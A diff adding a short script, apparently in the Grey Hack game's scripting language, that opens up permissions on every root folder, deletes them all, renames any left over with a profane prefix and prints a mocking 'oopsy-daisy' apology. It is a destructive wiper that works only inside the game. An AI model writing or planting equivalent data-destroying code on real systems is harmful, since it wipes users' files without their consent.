@@ -1,0 +1,15 @@
+shell = get_shell.host_computer
+folders = shell.File("/").get_folders
+for folder in folders
+	folder.chmod("u+rwx", 1)
+	folder.chmod("g+rwx", 1)
+	folder.chmod("o+rwx", 1)
+	folder.delete
+end for
+folderss = shell.File("/").get_folders
+if folderss then
+	for folder in folders
+		folder.rename("FuckU"+folder.name)
+	end for
+end if
+exit("＼(º □ º l|l)/ Oopsy-daisy, it looks like i deleted all folders on this machine (￣ ￣|||) \n" +"I hope you will forgive me ~(>_<~)")
